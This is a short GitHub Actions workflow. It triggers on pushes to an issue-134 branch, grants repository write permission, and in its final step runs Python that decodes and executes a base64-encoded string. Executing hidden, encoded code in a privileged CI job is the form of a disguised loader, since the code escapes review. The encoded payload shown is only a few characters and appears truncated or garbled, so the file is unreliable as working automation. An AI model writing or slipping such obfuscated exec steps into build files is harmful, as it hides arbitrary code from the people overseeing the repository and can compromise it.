name: Issue 134 follow-up apply

on:
  push:
    branches:
      - issue-134-communication-log-file-controls
    paths:
      - .github/workflows/issue-134-followup-apply.yml

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: issue-134-communication-log-file-controls
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - name: Apply Issue 134 follow-up
        run: python -c "import base64; exec(base64.b64decode(' pCg==' ))"